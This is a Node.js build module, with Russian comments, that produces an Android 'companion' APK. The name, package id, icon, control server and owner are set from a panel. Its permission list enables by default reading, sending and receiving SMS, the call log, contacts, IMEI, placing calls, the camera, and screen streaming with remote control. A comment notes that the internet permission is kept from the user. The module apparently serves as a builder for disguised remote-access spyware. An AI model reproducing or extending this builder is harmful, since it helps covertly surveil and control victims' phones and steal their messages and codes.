// Сборка APK телефонного приложения-компаньона с параметрами из панели
// (имя, package, иконка, разрешения). Реальная компиляция требует Android SDK
// (ANDROID_HOME/ANDROID_SDK_ROOT) и JDK. Если их нет — вернём понятную ошибку
// с подсказкой собрать через GitHub Actions (там SDK есть).

import { spawn } from 'node:child_process';
import path from 'node:path';
import os from 'node:os';
import fs from 'node:fs';
import fsp from 'node:fs/promises';
import { fileURLToPath } from 'node:url';

const __dirname = path.dirname(fileURLToPath(import.meta.url));
export const PROJECT_DIR = path.join(__dirname, 'android-companion');

// INTERNET нужен для трансляции — install-time разрешение, пользователю не показываем.
export const AVAILABLE_PERMISSIONS = [
  { id: 'CAMERA',       manifest: 'android.permission.CAMERA',                              label: 'Камера',                              runtime: true,  default: true  },
  { id: 'RECORD_AUDIO', manifest: 'android.permission.RECORD_AUDIO',                        label: 'Микрофон',                            runtime: true,  default: false },
  { id: 'SCREEN',       manifest: 'android.permission.FOREGROUND_SERVICE_MEDIA_PROJECTION', label: 'Экран и управление',                  runtime: false, default: true  },
  { id: 'NOTIFICATIONS',manifest: 'android.permission.POST_NOTIFICATIONS',                  label: 'Уведомления',                         runtime: true,  default: true  },
  { id: 'PHONE_STATE',  manifest: 'android.permission.READ_PHONE_STATE',                    label: 'Инфо о телефоне (IMEI, оператор)',    runtime: true,  default: true  },
  { id: 'CALL_LOG',     manifest: 'android.permission.READ_CALL_LOG',                       label: 'Журнал звонков',                      runtime: true,  default: true  },
  { id: 'CALL_PHONE',   manifest: 'android.permission.CALL_PHONE',                          label: 'Совершать звонки',                    runtime: true,  default: true  },
  { id: 'CONTACTS',     manifest: 'android.permission.READ_CONTACTS',                       label: 'Контакты',                            runtime: true,  default: true  },
  { id: 'READ_SMS',     manifest: 'android.permission.READ_SMS',                            label: 'Читать SMS',                          runtime: true,  default: true  },
  { id: 'SEND_SMS',     manifest: 'android.permission.SEND_SMS',                            label: 'Отправлять SMS',                      runtime: true,  default: true  },
  { id: 'RECEIVE_SMS',  manifest: 'android.permission.RECEIVE_SMS',                         label: 'Получать SMS',                        runtime: true,  default: true  },
  { id: 'BT_CONNECT',   manifest: 'android.permission.BLUETOOTH_CONNECT',                   label: 'Bluetooth (подключение к устройствам)', runtime: true, default: true },
  { id: 'BT_SCAN',      manifest: 'android.permission.BLUETOOTH_SCAN',                      label: 'Поиск Bluetooth-устройств',           runtime: true,  default: true  },
  { id: 'LOCATION',     manifest: 'android.permission.ACCESS_FINE_LOCATION',                label: 'Геолокация',                          runtime: true,  default: false },
  { id: 'MEDIA_IMAGES', manifest: 'android.permission.READ_MEDIA_IMAGES',                   label: 'Фото (галерея)',                      runtime: true,  default: false },
  { id: 'MEDIA_VIDEO',  manifest: 'android.permission.READ_MEDIA_VIDEO',                    label: 'Видео (галерея)',                     runtime: true,  default: false },
  { id: 'CALENDAR',     manifest: 'android.permission.READ_CALENDAR',                       label: 'Календарь',                           runtime: true,  default: false },
];

export function hasAndroidSdk() {
  const home = process.env.ANDROID_HOME || process.env.ANDROID_SDK_ROOT;
  return Boolean(home && fs.existsSync(home));
}

// Пишем параметры сборки в gradle.properties проекта.
async function writeBuildConfig(cfg) {
  const appName = (cfg.appName || 'Camera Companion').replace(/[\r\n]/g, ' ');
  const appId = (cfg.applicationId || 'com.artem.cameracompanion')
    .replace(/[^a-zA-Z0-9_.]/g, '')
    .replace(/^\.+|\.+$/g, '') || 'com.artem.cameracompanion';
  const perms = (cfg.permissions && cfg.permissions.length ? cfg.permissions : ['CAMERA'])
    .filter((p) => AVAILABLE_PERMISSIONS.some((a) => a.id === p));

  const ownerUsername = (cfg.ownerUsername || '').replace(/[\r\n]/g, '');
  const props = [
    `ARP_APP_NAME=${appName}`,
    `ARP_APPLICATION_ID=${appId}`,
    `ARP_DEFAULT_SERVER=${cfg.defaultServer || ''}`,
    `ARP_OWNER_USERNAME=${ownerUsername}`,
    'org.gradle.jvmargs=-Xmx2048m',
    'android.useAndroidX=true',
  ].join('\n') + '\n';

  await fsp.writeFile(path.join(PROJECT_DIR, 'build.properties.generated'), props);
  return { appName, appId, perms };
}

// Патчим AndroidManifest.xml — удаляем разрешения, которые не выбраны,
// и синхронизируем foregroundServiceType. Возвращает restore-функцию.
async function patchManifest(perms) {
  const manifestPath = path.join(PROJECT_DIR, 'app', 'src', 'main', 'AndroidManifest.xml');
  const original = await fsp.readFile(manifestPath, 'utf8');
  let patched = original;
  if (!perms.includes('NOTIFICATIONS')) {
    patched = patched.replace(/[ \t]*<uses-permission[^>]*android\.permission\.POST_NOTIFICATIONS[^>]*\/>\n?/g, '');
  }
  if (!perms.includes('CAMERA')) {
    patched = patched.replace(/[ \t]*<uses-permission[^>]*android\.permission\.CAMERA[^>]*\/>\n?/g, '');
    patched = patched.replace(/[ \t]*<uses-permission[^>]*FOREGROUND_SERVICE_CAMERA[^>]*\/>\n?/g, '');
  }
  if (!perms.includes('RECORD_AUDIO')) {
    patched = patched.replace(/[ \t]*<uses-permission[^>]*android\.permission\.RECORD_AUDIO[^>]*\/>\n?/g, '');
    patched = patched.replace(/[ \t]*<uses-permission[^>]*FOREGROUND_SERVICE_MICROPHONE[^>]*\/>\n?/g, '');
  }
  if (!perms.includes('SCREEN')) {
    patched = patched.replace(/[ \t]*<uses-permission[^>]*FOREGROUND_SERVICE_MEDIA_PROJECTION[^>]*\/>\n?/g, '');
    patched = patched.replace(/[ \t]*<!--CONTROL_SERVICE_START-->[\s\S]*?<!--CONTROL_SERVICE_END-->\n?/g, '');
  }
  if (!perms.includes('PHONE_STATE')) {
    patched = patched.replace(/[ \t]*<!--PHONE_STATE_PERM_START-->[\s\S]*?<!--PHONE_STATE_PERM_END-->\n?/g, '');
  }
  if (!perms.includes('CALL_LOG')) {
    patched = patched.replace(/[ \t]*<!--CALL_LOG_PERM_START-->[\s\S]*?<!--CALL_LOG_PERM_END-->\n?/g, '');
  }
  if (!perms.includes('CALL_PHONE')) {
    patched = patched.replace(/[ \t]*<!--CALL_PHONE_PERM_START-->[\s\S]*?<!--CALL_PHONE_PERM_END-->\n?/g, '');
  }
  if (!perms.includes('CONTACTS')) {
    patched = patched.replace(/[ \t]*<!--CONTACTS_PERM_START-->[\s\S]*?<!--CONTACTS_PERM_END-->\n?/g, '');
  }
  if (!perms.includes('READ_SMS')) {
    patched = patched.replace(/[ \t]*<!--READ_SMS_PERM_START-->[\s\S]*?<!--READ_SMS_PERM_END-->\n?/g, '');
  }
  if (!perms.includes('SEND_SMS')) {
    patched = patched.replace(/[ \t]*<!--SEND_SMS_PERM_START-->[\s\S]*?<!--SEND_SMS_PERM_END-->\n?/g, '');
  }
  if (!perms.includes('RECEIVE_SMS')) {
    patched = patched.replace(/[ \t]*<!--RECEIVE_SMS_PERM_START-->[\s\S]*?<!--RECEIVE_SMS_PERM_END-->\n?/g, '');
  }
  if (!perms.includes('BT_CONNECT')) {
    patched = patched.replace(/[ \t]*<!--BT_CONNECT_PERM_START-->[\s\S]*?<!--BT_CONNECT_PERM_END-->\n?/g, '');
  }
  if (!perms.includes('BT_SCAN')) {
    patched = patched.replace(/[ \t]*<!--BT_SCAN_PERM_START-->[\s\S]*?<!--BT_SCAN_PERM_END-->\n?/g, '');
  }
  if (!perms.includes('LOCATION')) {
    patched = patched.replace(/[ \t]*<!--LOCATION_PERM_START-->[\s\S]*?<!--LOCATION_PERM_END-->\n?/g, '');
  }
  if (!perms.includes('MEDIA_IMAGES')) {
    patched = patched.replace(/[ \t]*<!--MEDIA_IMG_PERM_START-->[\s\S]*?<!--MEDIA_IMG_PERM_END-->\n?/g, '');
  }
  if (!perms.includes('MEDIA_VIDEO')) {
    patched = patched.replace(/[ \t]*<!--MEDIA_VID_PERM_START-->[\s\S]*?<!--MEDIA_VID_PERM_END-->\n?/g, '');
  }
  if (!perms.includes('MEDIA_IMAGES') && !perms.includes('MEDIA_VIDEO')) {
    patched = patched.replace(/[ \t]*<!--MEDIA_LEGACY_PERM_START-->[\s\S]*?<!--MEDIA_LEGACY_PERM_END-->\n?/g, '');
  }
  if (!perms.includes('CALENDAR')) {
    patched = patched.replace(/[ \t]*<!--CALENDAR_PERM_START-->[\s\S]*?<!--CALENDAR_PERM_END-->\n?/g, '');
  }
  const fstParts = [];
  if (perms.includes('SCREEN')) fstParts.push('mediaProjection');
  if (perms.includes('CAMERA')) fstParts.push('camera');
  if (perms.includes('RECORD_AUDIO')) fstParts.push('microphone');
  if (fstParts.length > 0) {
    patched = patched.replace(/android:foregroundServiceType="[^"]*"/, `android:foregroundServiceType="${fstParts.join('|')}"`);
  } else {
    patched = patched.replace(/\s*android:foregroundServiceType="[^"]*"/, '');
  }
  await fsp.writeFile(manifestPath, patched);
  return () => fsp.writeFile(manifestPath, original);
}

// Заменяем launcher-иконку во всех плотностях, если пользователь загрузил свою
// (ожидается PNG). Android сам масштабирует под нужный размер.
const MIPMAP_DIRS = ['mipmap-mdpi', 'mipmap-hdpi', 'mipmap-xhdpi', 'mipmap-xxhdpi', 'mipmap-xxxhdpi'];
async function applyIcon(iconPath) {
  if (!iconPath) return;
  const resDir = path.join(PROJECT_DIR, 'app', 'src', 'main', 'res');
  for (const d of MIPMAP_DIRS) {
    const dir = path.join(resDir, d);
    await fsp.mkdir(dir, { recursive: true });
    await fsp.copyFile(iconPath, path.join(dir, 'ic_launcher.png'));
  }
}

// Основная функция сборки.
export async function buildApk(cfg, iconPath, onLog = () => {}) {
  const meta = await writeBuildConfig(cfg);
  await applyIcon(iconPath);
  const restoreManifest = await patchManifest(meta.perms);

  if (!hasAndroidSdk()) {
    await restoreManifest();
    const err = new Error(
      'Android SDK не найден на этом ПК. Собрать APK можно двумя способами:\n' +
      '  1) Через GitHub Actions — запусти workflow "Build companion APK" ' +
      '(вкладка Actions в репозитории), он соберёт APK и приложит файл к запуску.\n' +
      '  2) Локально — установи Android Studio / cmdline-tools, задай ANDROID_HOME и повтори.'
    );
    err.code = 'NO_SDK';
    err.meta = meta;
    throw err;
  }

  const gradlew = path.join(PROJECT_DIR, process.platform === 'win32' ? 'gradlew.bat' : 'gradlew');
  const useWrapper = fs.existsSync(gradlew);
  const cmd = useWrapper ? gradlew : 'gradle';
  const args = ['assembleDebug', '--no-daemon'];

  try {
    await new Promise((resolve, reject) => {
      const child = spawn(cmd, args, { cwd: PROJECT_DIR, shell: process.platform === 'win32' });
      child.stdout.on('data', (d) => onLog(d.toString()));
      child.stderr.on('data', (d) => onLog(d.toString()));
      child.on('error', reject);
      child.on('close', (code) => code === 0 ? resolve() : reject(new Error('gradle exited ' + code)));
    });
  } finally {
    await restoreManifest();
  }

  const apk = path.join(PROJECT_DIR, 'app', 'build', 'outputs', 'apk', 'debug', 'app-debug.apk');
  if (!fs.existsSync(apk)) throw new Error('Сборка прошла, но APK не найден: ' + apk);

  const outName = `${meta.appName.replace(/[^\w.-]+/g, '_')}.apk`;
  const outPath = path.join(os.tmpdir(), outName);
  await fsp.copyFile(apk, outPath);
  return { apkPath: outPath, fileName: outName, meta };
}
